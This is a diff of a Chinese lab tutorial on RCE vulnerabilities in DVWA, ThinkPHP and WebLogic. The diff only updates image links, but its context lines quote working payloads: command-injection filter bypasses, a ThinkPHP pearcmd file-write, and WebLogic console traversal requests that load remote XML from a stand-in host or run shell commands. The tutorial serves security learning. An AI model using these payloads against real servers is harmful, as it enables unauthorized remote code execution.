@@ -16,7 +16,7 @@ RCE 漏洞可以让攻击者向后台服务器远程注入命令或者代码，�
 
 在 Command Injection 模块中，可以输入地址进行 ping：
 
-![](http://img.wukaipeng.com/2023/11/05-105958-image-20231105105958709.png)
+![](https://img.wukaipeng.com/2023/11/05-105958-image-20231105105958709.png)
 
 利用多条命令执行语法：
 
@@ -27,7 +27,7 @@ RCE 漏洞可以让攻击者向后台服务器远程注入命令或者代码，�
 
 
 
-![](http://img.wukaipeng.com/2023/11/05-110414-image-20231105110414424.png)
+![](https://img.wukaipeng.com/2023/11/05-110414-image-20231105110414424.png)
 
 ### Medium
 
@@ -68,7 +68,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 发现仅限制了 `&&` 和 `;`，可以使用 `|` 绕开：
 
-![](http://img.wukaipeng.com/2023/11/05-110638-image-20231105110638798.png)
+![](https://img.wukaipeng.com/2023/11/05-110638-image-20231105110638798.png)
 
 ### High
 
@@ -116,7 +116,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 发现对 `| ` 限制不严格，其包含空格，可以使用不添加空格绕过：
 
-![image-20231105110831156](http://img.wukaipeng.com/2023/11/05-110831-image-20231105110831156.png)
+![image-20231105110831156](https://img.wukaipeng.com/2023/11/05-110831-image-20231105110831156.png)
 
 ## ThinkPHP
 
@@ -152,23 +152,23 @@ docker run -d -p 8080:80 --name=thinkphp vulfocus/thinkphp:6.0.12
 
 访问 `http://YOUR_IP_ADDRESS:PORT/public/`
 
-![](http://img.wukaipeng.com/2023/11/05-121646-te4OUO-image-20231105121646273.png)
+![](https://img.wukaipeng.com/2023/11/05-121646-te4OUO-image-20231105121646273.png)
 
 ### 演示
 
 传入 `?lang=../../../../../../../../usr/local/lib/php/pearcmd`，出现该错误说明漏洞存在：
 
-![](http://img.wukaipeng.com/2023/11/05-134533-CRlH1y-image-20231105134533378.png)
+![](https://img.wukaipeng.com/2023/11/05-134533-CRlH1y-image-20231105134533378.png)
 
 传入 EXP（Exploit，利用系统漏洞进行攻击的程序）：
 
 `?lang=../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo()?>+/var/www/html/wukaipeng.php`
 
-![](http://img.wukaipeng.com/2023/11/05-135319-3PXoxe-image-20231105135319002.png)
+![](https://img.wukaipeng.com/2023/11/05-135319-3PXoxe-image-20231105135319002.png)
 
 写入成功，访问该文件：
 
-![](http://img.wukaipeng.com/2023/11/05-135402-z1lqJZ-image-20231105135402344.png)
+![](https://img.wukaipeng.com/2023/11/05-135402-z1lqJZ-image-20231105135402344.png)
 
 ## Weblogic
 
@@ -216,7 +216,7 @@ services:
 
 访问 `http://YOUR_IP_ADDRESS:PORT/console`：
 
-![](http://img.wukaipeng.com/2023/11/07-070126-2urR2E-image-20231107070126724.png)
+![](https://img.wukaipeng.com/2023/11/07-070126-2urR2E-image-20231107070126724.png)
 
 停止容器：`docker compose stop`
 
@@ -231,7 +231,7 @@ services:
 
 其中 `%252e%252e%252f` 是 `../.` 进行两次 URL 编码，通过这个可以实现路径穿越，可未授权直接访问后台。
 
-![](http://img.wukaipeng.com/2023/11/07-070820-wnOWJt-image-20231107070820297.png)
+![](https://img.wukaipeng.com/2023/11/07-070820-wnOWJt-image-20231107070820297.png)
 
 目前权限不足，要想实现 RCE 需要借助另外一个漏洞。
 
@@ -260,7 +260,7 @@ services:
 
 然后利用 DVWA 上传，得到公网可访问链接 `http://DVWA_IP_ADDERSS:PORT/hackable/uploads/rce.xml`
 
-![](http://img.wukaipeng.com/2023/11/07-071901-1rD79B-image-20231107071900897.png)
+![](https://img.wukaipeng.com/2023/11/07-071901-1rD79B-image-20231107071900897.png)
 
 访问：`http://YOUR_IP_ADDRESS/console/images/%252e%252e%252fconsole.portal?
 _nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.su
@@ -268,11 +268,11 @@ pport.FileSystemXmlApplicationContext("http://example.com/rce.xml")`
 
 其中 `http://example.com/rce.xml` 替换成刚才上传的地址：
 
-![](http://img.wukaipeng.com/2023/11/07-074256-mEVN6R-image-20231107074256077.png)
+![](https://img.wukaipeng.com/2023/11/07-074256-mEVN6R-image-20231107074256077.png)
 
 去到容器中，可以看到我们的文件也上传成功了：
 
-![](http://img.wukaipeng.com/2023/11/07-074418-NlE1jX-image-20231107074418579.png)
+![](https://img.wukaipeng.com/2023/11/07-074418-NlE1jX-image-20231107074418579.png)
 
 ---
 
@@ -284,7 +284,7 @@ pport.FileSystemXmlApplicationContext("http://example.com/rce.xml")`
 http://YOUR_IP_ADDRESS:PORT/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/wukaipeng2');")
 ```
 
-![](http://img.wukaipeng.com/2023/11/07-074958-3WX5N3-image-20231107074958334.png)
+![](https://img.wukaipeng.com/2023/11/07-074958-3WX5N3-image-20231107074958334.png)
 
 ### 修复
 
